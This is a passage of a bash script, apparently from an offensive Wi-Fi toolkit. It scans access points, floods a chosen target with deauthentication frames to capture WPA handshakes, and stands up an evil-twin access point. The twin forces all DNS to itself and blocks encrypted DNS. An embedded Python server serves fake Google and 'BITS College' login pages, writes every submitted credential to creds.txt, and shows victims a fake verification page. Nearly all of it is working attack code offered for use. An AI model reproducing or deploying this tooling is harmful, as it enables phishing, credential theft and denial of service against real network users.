    MONITOR_ACTUAL="$mon_iface"
}

do_scan() {
    ensure_scan_parser
    ensure_tool airodump-ng aircrack-ng
    pkill -9 -f airodump-ng 2>/dev/null
    sleep 1
    ensure_monitor_on 6 >/dev/null
    rm -f ${SCAN_PREFIX}-01.csv "$SCAN_READY"
    print_banner
    echo -e "${CYAN}[*] Opening live scan on $MONITOR_ACTUAL...${NC}"
    echo -e "${DIM}    Ctrl+C the scan window when you see your AP.${NC}"
    echo ""
    launch_xterm -bg black -fg '#00ff88' -title "LIVE SCAN" -geometry $G_DEAUTH -e \
        bash -c "airodump-ng --band abg --write-interval 1 $MONITOR_ACTUAL -w $SCAN_PREFIX --output-format csv; touch $SCAN_READY"
    printf "${CYAN}[*]${NC} Waiting for scan "
    while [ ! -f "$SCAN_READY" ]; do printf "${YELLOW}.${NC}"; sleep 0.5; done
    echo ""; sleep 1
    echo ""
    echo -e "${BOLD}${CYAN}================= NETWORKS =================${NC}"
    printf "${BOLD}%-4s %-20s %-4s %-6s %s${NC}\n" "No." "BSSID" "CH" "PWR" "ESSID"
    echo -e "${CYAN}--------------------------------------------${NC}"
    BSSIDS=(); CHANNELS=(); ESSIDS=(); i=1
    awk -F',' -f "$SCAN_PARSER" "${SCAN_PREFIX}-01.csv" > "${LOGS_DIR}/evi-networks.txt" 2>/dev/null
    while IFS=, read -r bssid ch pwr essid; do
        [ -z "$bssid" ] && continue
        [ -z "$essid" ] && essid="(hidden)"
        pwr_num=${pwr//[!0-9-]/}; [ -z "$pwr_num" ] && pwr_num=0
        if [ "$pwr_num" -ge -60 ] 2>/dev/null; then pc="${GREEN}"
        elif [ "$pwr_num" -ge -75 ] 2>/dev/null; then pc="${YELLOW}"
        else pc="${RED}"; fi
        printf "${BOLD}%-4s${NC} ${YELLOW}%-20s${NC} ${CYAN}%-4s${NC} ${pc}%-6s${NC} ${GREEN}%s${NC}\n" "$i" "$bssid" "$ch" "$pwr" "$essid"
        BSSIDS[$i]="$bssid"; CHANNELS[$i]="$ch"; ESSIDS[$i]="$essid"; i=$((i+1))
    done < "${LOGS_DIR}/evi-networks.txt"
    echo -e "${CYAN}--------------------------------------------${NC}"
    if [ ${#BSSIDS[@]} -eq 0 ]; then
        read -p "$(echo -e ${YELLOW}'BSSID: '${NC})" TARGET_BSSID
        read -p "$(echo -e ${YELLOW}'Channel: '${NC})" TARGET_CHANNEL
        read -p "$(echo -e ${YELLOW}'ESSID: '${NC})" TARGET_ESSID
    else
        read -p "$(echo -e ${YELLOW}'Target number: '${NC})" TARGET_NUM
        TARGET_BSSID="${BSSIDS[$TARGET_NUM]}"
        TARGET_CHANNEL="${CHANNELS[$TARGET_NUM]}"
        TARGET_ESSID="${ESSIDS[$TARGET_NUM]}"
    fi
    [ -z "$TARGET_BSSID" ] && return 1
    [ -z "$TARGET_CHANNEL" ] && return 1
    echo -e "${GREEN}[+] Target: $TARGET_ESSID ($TARGET_BSSID) ch $TARGET_CHANNEL${NC}"
    return 0
}

brand_detect() {
    local e=$(echo "$TARGET_ESSID" | tr "[:upper:]" "[:lower:]")
    case "$e" in
        *tplink*|*tp-link*) BRAND_NAME="TP-Link" ;;
        *comnect*) BRAND_NAME="Comnect" ;;
        *comnet*) BRAND_NAME="Comnet" ;;
        *dlink*|*d-link*) BRAND_NAME="D-Link" ;;
        *netgear*) BRAND_NAME="NETGEAR" ;;
        *asus*) BRAND_NAME="ASUS" ;;
        *huawei*) BRAND_NAME="Huawei" ;;
        *tenda*) BRAND_NAME="Tenda" ;;
        *mikrotik*) BRAND_NAME="MikroTik" ;;
        *linksys*) BRAND_NAME="Linksys" ;;
        *xiaomi*) BRAND_NAME="Xiaomi" ;;
        *totolink*) BRAND_NAME="TOTOLINK" ;;
        *mercusys*) BRAND_NAME="MERCUSYS" ;;
        *zte*) BRAND_NAME="ZTE" ;;
        *cudy*) BRAND_NAME="Cudy" ;;
        *keenetic*) BRAND_NAME="Keenetic" ;;
        *ubiquiti*|*unifi*) BRAND_NAME="Ubiquiti" ;;
        *) BRAND_NAME="$TARGET_ESSID" ;;
    esac
}

auto_capture_handshake() {
    local capfile="$1"
    ensure_tool airodump-ng aircrack-ng
    ensure_tool aireplay-ng aircrack-ng
    rm -f "$HS_DONE"
    ensure_monitor_on $TARGET_CHANNEL
    launch_xterm -bg black -fg '#66aaff' -title "HS CAPTURE" -geometry $G_DEAUTH -e \
        bash -c "airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $capfile $MONITOR_ACTUAL"
    sleep 3
    launch_xterm -bg black -fg '#ff5555' -title "DEAUTH (aireplay-ng)" -geometry $G_AP -e \
        bash -c "ip link set $MONITOR_ACTUAL down 2>/dev/null; iw dev $MONITOR_ACTUAL set type monitor 2>/dev/null; iw dev $MONITOR_ACTUAL set channel $TARGET_CHANNEL 2>/dev/null; ip link set $MONITOR_ACTUAL up 2>/dev/null; sleep 1; aireplay-ng --ignore-negative-one --deauth 0 -a $TARGET_BSSID $MONITOR_ACTUAL; echo; echo '>>> stopped'; read"
    printf "${CYAN}[*]${NC} Waiting for handshake "
    while true; do
        sleep 2; printf "${YELLOW}.${NC}"
        if [ -f "${capfile}-01.cap" ]; then
            if aircrack-ng "${capfile}-01.cap" 2>/dev/null | grep -q "WPA (1 handshake"; then
                touch "$HS_DONE"; break
            fi
        fi
    done
    echo ""
    pkill -9 -f aireplay-ng >/dev/null 2>&1
    pkill -9 -f "airodump-ng.*$capfile" >/dev/null 2>&1
    sleep 2
    HANDSHAKE_CAP="${capfile}-01.cap"
    echo -e "${GREEN}[+] Handshake captured:${NC}"
    echo -e "    ${BOLD}${YELLOW}$HANDSHAKE_CAP${NC}"
}

setup_ap_interfaces() {
    ensure_tool hostapd
    ensure_tool dnsmasq
    pkill -9 -f hostapd >/dev/null 2>&1
    pkill -9 -f dnsmasq >/dev/null 2>&1
    pkill -9 -f "evil-server.py" >/dev/null 2>&1
    pkill -9 -f airodump-ng >/dev/null 2>&1
    pkill -9 -f aireplay-ng >/dev/null 2>&1
    sleep 2
    systemctl stop NetworkManager >/dev/null 2>&1
    systemctl stop wpa_supplicant >/dev/null 2>&1
    pkill -9 -f wpa_supplicant >/dev/null 2>&1
    pkill -9 -f "dhclient.*$INTERFACE" >/dev/null 2>&1
    sleep 2
    iw dev "$INTERFACE" disconnect >/dev/null 2>&1
    if ip link show "$MONITOR" >/dev/null 2>&1; then ip link set "$MONITOR" down >/dev/null 2>&1; fi
    if iw dev "$MONITOR" info >/dev/null 2>&1; then iw dev "$MONITOR" del >/dev/null 2>&1; fi
    sleep 2
    ip link set "$INTERFACE" down >/dev/null 2>&1
    iw "$INTERFACE" set type managed >/dev/null 2>&1
    ip link set "$INTERFACE" up >/dev/null 2>&1
    ip addr flush dev "$INTERFACE" >/dev/null 2>&1
    sleep 2
    echo -e "${CYAN}[*] Starting hostapd on $INTERFACE ch $TARGET_CHANNEL...${NC}"
    hostapd $HOSTAPD_CONF -B -f $HOSTAPD_LOG >>"$PHOBIA_DEBUG_LOG" 2>&1
    sleep 5
    if ! iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Master"; then
        echo -e "${RED}[!] $INTERFACE is not in Master mode. hostapd log:${NC}"
        tail -20 $HOSTAPD_LOG
        return 1
    fi
    echo -e "${GREEN}[+] hostapd running — $INTERFACE is Master${NC}"
    ip addr add "$PORTAL_IP/24" dev "$INTERFACE" >/dev/null 2>&1
    ip link set "$INTERFACE" up >/dev/null 2>&1
    sleep 2
    local tries=0
    while [ $tries -lt 5 ]; do
        if ip addr show "$INTERFACE" | grep -q "$PORTAL_IP"; then break; fi
        ip addr add "$PORTAL_IP/24" dev "$INTERFACE" >/dev/null 2>&1
        sleep 2
        tries=$((tries+1))
    done
    if ! ip addr show "$INTERFACE" | grep -q "$PORTAL_IP"; then
        echo -e "${RED}[!] Cannot assign $PORTAL_IP to $INTERFACE${NC}"
        ip addr show "$INTERFACE"
        return 1
    fi
    echo -e "${GREEN}[+] $PORTAL_IP confirmed${NC}"
    iw dev "$INTERFACE" interface add "$MONITOR" type monitor >/dev/null 2>&1
    if iw dev "$MONITOR" info >/dev/null 2>&1; then
        ip link set "$MONITOR" up >/dev/null 2>&1
        sleep 1
        iw dev "$MONITOR" set channel "$TARGET_CHANNEL" >/dev/null 2>&1
        MONITOR_ACTUAL="$MONITOR"
        echo -e "${GREEN}[+] $MONITOR on ch $TARGET_CHANNEL${NC}"
    else
        MONITOR_ACTUAL="$INTERFACE"
        echo -e "${YELLOW}[!] No monitor VIF — deauth will be skipped${NC}"
    fi

    # block DoH fallback (prevents phones from bypassing our DNS via HTTPS)
    _rdhcp_silent sudo iptables -D FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 8.8.8.8 -j REJECT 2>/dev/null
    _rdhcp_silent sudo iptables -D FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 8.8.4.4 -j REJECT 2>/dev/null
    _rdhcp_silent sudo iptables -D FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 1.1.1.1 -j REJECT 2>/dev/null
    _rdhcp_silent sudo iptables -D FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 1.0.0.1 -j REJECT 2>/dev/null
    _rdhcp_silent sudo iptables -D FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 9.9.9.9 -j REJECT 2>/dev/null
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 8.8.8.8 -j REJECT
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 8.8.4.4 -j REJECT
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 1.1.1.1 -j REJECT
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 1.0.0.1 -j REJECT
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 9.9.9.9 -j REJECT
    # also block DoT (DNS over TLS on 853)
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p tcp --dport 853 -j REJECT
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p udp --dport 853 -j REJECT

    # ── FORCE all DNS through our dnsmasq ──
    # Even if the client has hardcoded 8.8.8.8 or its own resolver, we hijack
    # every DNS query hitting the AP interface and redirect it to our port 53.
    _rdhcp_silent sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p udp --dport 53 -j REDIRECT --to-port 53
    _rdhcp_silent sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 53 -j REDIRECT --to-port 53
    _rdhcp_silent sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp --dport 53 -j REDIRECT --to-port 53
    _rdhcp_silent sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 53 -j REDIRECT --to-port 53

    # redirect HTTP (80) to us so direct-to-IP web requests hit the portal
    _rdhcp_silent sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 80
    _rdhcp_silent sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 80

    # 443 handling: allow to our box (for HTTPS probe responder),
    # reject anything else (kills DoH to external resolvers)
    _rdhcp_silent sudo iptables -D INPUT   -i "$INTERFACE" -p tcp --dport 443 -j ACCEPT 2>/dev/null
    _rdhcp_silent sudo iptables -D FORWARD -i "$INTERFACE" -p tcp --dport 443 -j ACCEPT 2>/dev/null
    _rdhcp_silent sudo iptables -D INPUT   -i "$INTERFACE" -p tcp --dport 443 -j REJECT --reject-with tcp-reset 2>/dev/null
    _rdhcp_silent sudo iptables -D FORWARD -i "$INTERFACE" -p tcp --dport 443 -j REJECT --reject-with tcp-reset 2>/dev/null

    # INPUT: accept 443 to our box (probe responder listens there)
    _rdhcp_silent sudo iptables -A INPUT   -i "$INTERFACE" -p tcp --dport 443 -j ACCEPT
    # FORWARD: reject 443 to anywhere (kills DoH), unless destined for our box
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p tcp --dport 443 -d 10.0.0.1 -j ACCEPT
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p tcp --dport 443 -j REJECT --reject-with tcp-reset

    # kill DoT too (port 853)
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p tcp --dport 853 -j REJECT --reject-with tcp-reset
    _rdhcp_silent sudo iptables -A FORWARD -i "$INTERFACE" -p udp --dport 853 -j REJECT

    # start HTTPS probe responder on :443 (self-signed cert)
    pkill -9 -f https_probe.py 2>/dev/null || true
    nohup python3 $BASE_DIR/https_probe.py </dev/null >/tmp/https_probe.log 2>&1 &
    disown 2>/dev/null
    sleep 1
    return 0
}

prepare_evil_twin_vifs() {
    print_banner
    echo -e "${BOLD}${CYAN}========= PREPARING EVIL TWIN VIFs =========${NC}"
    echo ""
    loading "Preparing wireless VIFs"
    systemctl stop apache2 2>/dev/null
    pkill -9 -f wifiphisher 2>/dev/null
    pkill -9 -f hostapd 2>/dev/null
    pkill -9 -f dnsmasq 2>/dev/null
    pkill -9 -f captiveflask 2>/dev/null
    pkill -9 -f wpa_supplicant 2>/dev/null
    pkill -9 -f aireplay-ng 2>/dev/null
    pkill -9 -f airodump-ng 2>/dev/null
    sleep 1
    if ip link show "$MONITOR" >/dev/null 2>&1; then ip link set "$MONITOR" down >/dev/null 2>&1; fi
    if iw dev "$MONITOR" info >/dev/null 2>&1; then iw dev "$MONITOR" del >/dev/null 2>&1; fi
    sleep 1
    ip link set "$INTERFACE" down >/dev/null 2>&1
    iw "$INTERFACE" set type managed >/dev/null 2>&1
    ip link set "$INTERFACE" up >/dev/null 2>&1
    sleep 2
    iw dev "$INTERFACE" interface add "$MONITOR" type monitor >/dev/null 2>&1
    ip link set "$MONITOR" up >/dev/null 2>&1
    sleep 2
    if iw dev "$MONITOR" info >/dev/null 2>&1; then
        MONITOR_ACTUAL="$MONITOR"
        iw dev "$MONITOR" set channel 6 >/dev/null 2>&1
        echo -e "${GREEN}[+] $MONITOR_ACTUAL ready${NC}"
    else
        MONITOR_ACTUAL="$INTERFACE"
        echo -e "${YELLOW}[!] Using $INTERFACE as monitor${NC}"
    fi
    echo ""; iwconfig 2>/dev/null | grep -E "^wlan"
    echo -e "${GREEN}[+] VIFs ready.${NC}"
    sleep 2
}

evil_twin_phish() {
    print_banner
    echo -e "${BOLD}${CYAN}================ AP SOURCE ================${NC}"
    echo -e "  ${GREEN}1)${NC} Create new AP (custom SSID)"
    echo -e "  ${GREEN}2)${NC} Use existing AP (live scan)"
    echo -e "${BOLD}${CYAN}===========================================${NC}"
    read -p "$(echo -e ${YELLOW}'Select [1/2]: '${NC})" AP_SRC
    loading_bar "Loading"
    if [ "$AP_SRC" = "1" ]; then
        read -p "$(echo -e ${YELLOW}'SSID name [BITS College Lab 1]: '${NC})" TARGET_ESSID
    TARGET_ESSID="${TARGET_ESSID:-BITS College Lab 1}"
        read -p "$(echo -e ${YELLOW}'Channel [6]: '${NC})" TARGET_CHANNEL
        TARGET_CHANNEL="${TARGET_CHANNEL:-6}"
        TARGET_BSSID=""; DO_DEAUTH="no"
    elif [ "$AP_SRC" = "2" ]; then
        do_scan || return
        echo ""
        echo -e "${BOLD}${CYAN}=========== DEAUTH ===========${NC}"
        echo -e "  ${GREEN}1)${NC} WITH deauth"
        echo -e "  ${GREEN}2)${NC} WITHOUT deauth"
        echo -e "${BOLD}${CYAN}==============================${NC}"
        read -p "$(echo -e ${YELLOW}'Select [1/2]: '${NC})" DA
        loading_bar "Loading"
        if [ "$DA" = "1" ]; then DO_DEAUTH="yes"; else DO_DEAUTH="no"; fi
    else return; fi
    brand_detect
    echo -e "${BLUE}[+] Brand: $BRAND_NAME  Deauth: $DO_DEAUTH${NC}"

    ask_internet_passthrough
    reset_portal_state

    # ensure bits page + logo are always served
    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
    fi
    if [ -f "$PAGES_DIR/google-2step.html" ]; then
        cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
    fi

    # ensure bits page + logo are always served
    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
    fi
    if [ -f "$PAGES_DIR/google-2step.html" ]; then
        cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
    fi

    rm -rf /var/www/html; mkdir -p /var/www/html
    rm -f /var/www/html/creds.txt 2>/dev/null; touch /var/www/html/creds.txt; chmod 666 /var/www/html/creds.txt
    [ -f "$PAGES_DIR/verified.html" ] && cp "$PAGES_DIR/verified.html" /var/www/html/verified.html 2>/dev/null
    [ -f "$PAGES_DIR/google-2step.html" ] && cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
    [ -f "$PAGES_DIR/bits-login.html" ] && cp "$PAGES_DIR/bits-login.html" /var/www/html/bits-login.html 2>/dev/null
    chmod 644 /var/www/html/*.html 2>/dev/null
    [ ! -f "$G2SRC/index.html" ] && echo -e "${RED}[!] Missing google page.${NC}" && pause && return
    cp "$G2SRC/index.html" /var/www/html/index.html
    cp /var/www/html/index.html /tmp/original_page.html

    # if DNS popup-only mode, swap the page for the consent page
    if [ "$DNS_MODE" = "5" ]; then
        cp "$PAGES_DIR/dns-consent.html" /var/www/html/index.html
        cp /var/www/html/index.html /tmp/original_page.html
    fi

    python3 $BASE_DIR/inject_email_check.py 2>/dev/null || true

    dnsspoof_pick_mode

    cat > $HOSTAPD_CONF <<EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_ESSID
hw_mode=g
channel=$TARGET_CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
EOF

    cat > $DNSMASQ_CONF <<EOF
interface=$INTERFACE
bind-interfaces
listen-address=$PORTAL_IP
dhcp-range=$SUBNET_BASE.10,$SUBNET_BASE.100,255.255.255.0,12h
dhcp-option=3,$PORTAL_IP
dhcp-option=6,$PORTAL_IP
dhcp-option=114,http://$PORTAL_IP:$PORTAL_PORT/
address=/#/$PORTAL_IP
address=/www.msftconnecttest.com/$PORTAL_IP
address=/www.msftncsi.com/$PORTAL_IP
address=/dns.msftncsi.com/$PORTAL_IP
address=/connectivitycheck.gstatic.com/$PORTAL_IP
address=/connectivitycheck.android.com/$PORTAL_IP
address=/clients3.google.com/$PORTAL_IP
address=/clients4.google.com/$PORTAL_IP
address=/captive.apple.com/$PORTAL_IP
address=/detectportal.firefox.com/$PORTAL_IP
address=/dns.google/$PORTAL_IP
address=/dns.google.com/$PORTAL_IP
address=/dns64.dns.google/$PORTAL_IP
address=/cloudflare-dns.com/$PORTAL_IP
address=/mozilla.cloudflare-dns.com/$PORTAL_IP
address=/one.one.one.one/$PORTAL_IP
address=/doh.opendns.com/$PORTAL_IP
address=/dns.quad9.net/$PORTAL_IP
address=/doh.dns.apple.com/$PORTAL_IP
address=/mask.icloud.com/$PORTAL_IP
address=/mask-h2.icloud.com/$PORTAL_IP
address=/use-application-dns.net/$PORTAL_IP
address=/doh.dns.sb/$PORTAL_IP
address=/doh.pub/$PORTAL_IP
address=/dns.alidns.com/$PORTAL_IP
no-resolv
no-hosts
cache-size=0
EOF

    cat > $SERVER_PY <<'PYEOF'
import http.server, socketserver, os, sys, time, urllib.parse

PORT = 80
BIND = "10.0.0.1"
CREDS  = "/var/www/html/creds.txt"
ORIGINAL = "/tmp/original_page.html"

PROBES = [
    "/generate_204", "/gen_204", "/hotspot-detect.html",
    "/library/test/success.html", "/success.txt", "/connecttest.txt",
    "/redirect", "/ncsi.txt", "/canonical.html", "/fwlink", "/wpad.dat",
    "/captiveportal", "/portal", "/mobile/status.php",
    "/kindle-wifi/wifistub.html", "/check_network_status.txt"
]
PH = [
    "connectivitycheck.gstatic.com", "captive.apple.com",
    "www.msftconnecttest.com", "www.msftncsi.com",
    "detectportal.firefox.com", "clients3.google.com",
    "clients4.google.com", "connectivitycheck.android.com",
    "dns.msftncsi.com", "www.gstatic.com"
]

def page():
    try: return open(ORIGINAL, "rb").read()
    except: return b"<html><body>Sign in</body></html>"

CLEARED = set()

class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **k):
        super().__init__(*a, directory="/var/www/html", **k)

    def _log(self, msg):
        try:
            with open(CREDS, "a") as f: f.write(msg + "\n")
        except Exception: pass

    def _serve_file(self, path, ctype="text/html; charset=utf-8"):
        try: d = open(path, "rb").read()
        except Exception: d = b""
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(d)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try: self.wfile.write(d)
        except Exception: pass

    def _redirect(self, dest="http://10.0.0.1/"):
        self.send_response(302)
        self.send_header("Location", dest)
        self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
        self.send_header("Connection", "close")
        self.end_headers()

    def do_GET(self):
        ip = self.client_address[0]
        host = (self.headers.get("Host") or "").lower()
        path = self.path.split("?")[0]

        # explicit page routes
        if path in ("/google-2step.html", "/google-2step", "/google"):
            return self._serve_file("/var/www/html/google-2step.html")
        if path in ("/verified.html", "/verified"):
            try:
                d = open("/var/www/html/verified.html", "rb").read()
            except Exception:
                # full inline fallback — same design as verified.html
                d = """<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\">
<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">
<title>Account Verified — BITS College</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Arial,sans-serif;
background:#fff;color:#3a3a3a;padding:22px 16px;display:flex;align-items:center;
justify-content:center;min-height:100vh}
.wrap{width:100%;max-width:440px;text-align:center}
h1{font-size:18px;font-weight:400;color:#3a3a3a;margin-bottom:20px}
.notice{background:#f4f9ee;border:1px solid #d9e9c6;color:#3d6b1a;border-radius:6px;
padding:11px 14px;font-size:12.5px;line-height:1.5;margin-bottom:20px;text-align:center}
.card{background:#fff;border:1px solid #e6e6e6;border-radius:6px;padding:30px 24px 26px;
box-shadow:0 1px 3px rgba(0,0,0,.04)}
.badge{width:74px;height:74px;border-radius:50%;background:linear-gradient(135deg,#8bc34a,#6aa536);
display:flex;align-items:center;justify-content:center;margin:0 auto 18px;
box-shadow:0 6px 20px rgba(139,195,74,.35)}
.badge svg{width:36px;height:36px}
.tag{display:inline-block;background:#e8f5e0;color:#2f6b14;padding:5px 14px;border-radius:20px;
font-size:12px;font-weight:600;letter-spacing:.3px;margin-bottom:16px}
.welcome{font-size:15px;font-weight:600;color:#3a3a3a;margin-bottom:6px}
.email{font-size:12.5px;color:#7a7a7a;margin-bottom:18px}
.email .v{color:#3d6b1a;font-weight:600;font-family:monospace}
.body{font-size:13px;color:#7a7a7a;line-height:1.55;margin-bottom:22px}
.status{font-size:12px;color:#9aa896;margin-top:14px}
.foot{font-size:11px;color:#999;margin-top:22px}
</style></head><body>
<div class=\"wrap\">
<h1>BITS College's Online Application Service</h1>
<div class=\"notice\"><strong>Verification complete.</strong><br>
You now have full access to the lab network.</div>
<div class=\"card\">
<div class=\"badge\"><svg viewBox=\"0 0 24 24\" fill=\"none\">
<path d=\"M5 13l4 4L19 7\" stroke=\"#fff\" stroke-width=\"3\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>
</svg></div>
<div class=\"tag\">&#10003; ACCOUNT VERIFIED</div>
<div class=\"welcome\" id=\"w\">Welcome</div>
<div class=\"email\">Signed in as <span class=\"v\" id=\"em\">your account</span></div>
<p class=\"body\">Your BITS account has been successfully verified.<br>
You may safely close this window to continue.</p>
<div class=\"status\" id=\"st\">Closing automatically&hellip;</div>
</div>
<div class=\"foot\">&copy; BITS College</div>
</div>
<script>
var e='';try{var p=new URLSearchParams(location.search);e=p.get('e')||p.get('email')||'';}catch(_){}
try{e=e||sessionStorage.getItem('bits_email')||'';}catch(_){}
if(e){var l=e.split('@')[0]||'';var ps=l.split(/[._-]/).filter(Boolean);
var n=ps.map(function(x){return x.charAt(0).toUpperCase()+x.slice(1)}).join(' ');
if(n)document.getElementById('w').textContent='Welcome, '+n;
document.getElementById('em').textContent=e;}
setTimeout(function(){try{window.open('','_self').close();}catch(_){}
try{window.close();}catch(_){}
setTimeout(function(){document.getElementById('st').textContent='You may close this window manually.';},300);},2500);
</script></body></html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(d)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            try: self.wfile.write(d)
            except Exception: pass
            return
        if path.startswith("/bits-logo"):
            return self._serve_file("/var/www/html/bits-logo.png", "image/png")
        if path in ("/bits-login.html", "/bits-login"):
            return self._serve_file("/var/www/html/bits-login.html")

        # captive probe check
        is_probe = (
            any(p in self.path for p in PROBES) or
            any(x in host for x in PH)
        )
        if is_probe:
            return self._redirect()

        # static file wins
        fp = self.translate_path(path)
        if os.path.isfile(fp) and path not in ("/", "/index.html"):
            return super().do_GET()

        # landing page
        try:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            d = page()
            self.send_header("Content-Length", str(len(d)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(d)
        except Exception:
            pass

    def do_POST(self):
        ip = self.client_address[0]
        try: n = int(self.headers.get("Content-Length", 0) or 0)
        except Exception: n = 0
        raw = b""
        try: raw = self.rfile.read(n)
        except Exception: pass
        ctype = (self.headers.get("Content-Type") or "").lower()

        # parse body properly
        fields = {}
        try:
            if "application/x-www-form-urlencoded" in ctype:
                fields = {k: v[0] for k, v in urllib.parse.parse_qs(raw.decode("utf-8", "ignore")).items()}
            elif "multipart/form-data" in ctype:
                # crude multipart parser
                boundary = ctype.split("boundary=")[-1].strip('"')
                parts = raw.split(("--" + boundary).encode())
                for part in parts:
                    if b"\r\n\r\n" not in part: continue
                    head, body = part.split(b"\r\n\r\n", 1)
                    body = body.rstrip(b"\r\n-")
                    m = re.search(rb'name="([^"]+)"', head) if False else None
                    # use simple split
                    hs = head.decode("utf-8", "ignore")
                    nm = ""
                    for line in hs.split("\r\n"):
                        if 'name="' in line:
                            nm = line.split('name="', 1)[1].split('"', 1)[0]
                            break
                    if nm:
                        try: fields[nm] = body.decode("utf-8", "ignore")
                        except Exception: fields[nm] = ""
        except Exception as e:
            fields = {"_raw": raw.decode("utf-8", "ignore")[:200], "_err": str(e)}

        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        line = "[%s] %s POST %s -> %s" % (
            ts, ip, self.path,
            " | ".join("%s=%s" % (k, v) for k, v in fields.items()) or "(empty)"
        )
        print("[+] " + line, flush=True)
        self._log(line)

        CLEARED.add(ip)

        # grab email from parsed fields to pass to /verified?e=...
        email = ""
        for key in ("email", "user", "username", "login", "e"):
            if key in fields and fields[key]:
                email = fields[key]
                break
        # URL-encode the email
        import urllib.parse as _up
        eq = _up.quote(email, safe="") if email else ""

        # send a small verified page + JS redirect that carries the email
        redirect = "/verified"
        if eq:
            redirect = "/verified?e=" + eq

        body = (
            '<!DOCTYPE html><html><head><meta charset="utf-8">'
            '<title>Verified</title>'
            '<meta http-equiv="refresh" content="0;url=' + redirect + '">'
            '<script>'
            'try{ if("' + eq + '") sessionStorage.setItem("bits_email",'
            'decodeURIComponent("' + eq + '")); }catch(e){}'
            'window.location.replace("' + redirect + '");'
            '</script>'
            '<style>body{font-family:system-ui;background:#f7faf4;'
            'display:flex;align-items:center;justify-content:center;height:100vh;margin:0}'
            '.c{text-align:center}</style></head>'
            '<body><div class="c"><h2>Verified</h2><p>Redirecting…</p>'
            '</div></body></html>'
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        try: self.wfile.write(body)
        except Exception: pass

    def log_message(self, *a): pass

socketserver.TCPServer.allow_reuse_address = True
for _ in range(30):
    try:
        srv = socketserver.TCPServer((BIND, PORT), H)
        break
    except OSError as e:
        print("[!] bind failed:", e, flush=True); time.sleep(1)
else:
    print("[!] could not bind", flush=True); sys.exit(1)
srv.serve_forever()

PYEOF

    export BRAND_NAME
    setup_ap_interfaces || { pause; return; }

    echo -e "${CYAN}[*] Starting dnsmasq...${NC}"
    sudo rm -f /tmp/evil-dnsmasq.log 2>/dev/null; dnsmasq -C $DNSMASQ_CONF --log-queries --log-facility=/tmp/evil-dnsmasq.log >>"$PHOBIA_DEBUG_LOG" 2>&1
    sleep 1
    echo -e "${CYAN}[*] Starting web server...${NC}"
    nohup python3 $SERVER_PY > $SERVER_LOG 2>&1 </dev/null &
    sleep 1

    launch_xterm -bg black -fg '#00ff88' -title "AP STATUS" -geometry $G_AP -e bash -c "tail -f $HOSTAPD_LOG"
    launch_xterm -bg black -fg '#66aaff' -title "WEB SERVER" -geometry $G_WEB -e bash -c "tail -f $SERVER_LOG"
    launch_xterm -bg black -fg '#ffd700' -title "CREDS" -geometry $G_CREDS -e bash -c "tail -f /var/www/html/creds.txt"

    if [ "$DO_DEAUTH" = "yes" ] && [ -n "$TARGET_BSSID" ]; then
        launch_xterm -bg black -fg '#ff5555' -title "DEAUTH (aireplay-ng)" -geometry $G_DEAUTH -e \
